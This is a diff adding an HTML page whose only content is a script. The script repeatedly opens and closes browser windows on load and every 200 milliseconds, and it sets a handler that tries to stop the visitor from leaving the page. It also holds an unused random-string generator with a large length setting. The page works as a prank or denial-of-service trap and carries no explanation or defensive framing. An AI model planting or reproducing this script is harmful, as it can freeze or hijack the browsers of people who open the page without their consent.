@@ -1,0 +1,34 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>   
+    <script>
+    window.addEventListener('load', 
+      () => { 
+        spam()
+      });
+      window.onbeforeunload = nope
+      function nope() { 
+        return "Nope!"
+      }
+    function randomString(length) {
+        let result = '';
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let counter = 0;
+        while (counter < length) {
+          result += characters.charAt(Math.floor(Math.random() * characters.length));
+          counter += 1;
+        }
+        return result;
+    }
+    let length = 1500000
+    let loops = 50
+    let delay = 200
+    setInterval(spam, delay)
+    function spam() {
+      window.open().close()
+    
+    }
+  </script>
+  </head>
+</html>
